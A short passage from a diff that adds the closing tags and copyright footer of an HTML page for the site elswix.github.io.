+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 elswix.github.io</p>
+    </footer>
+</body>
+</html>
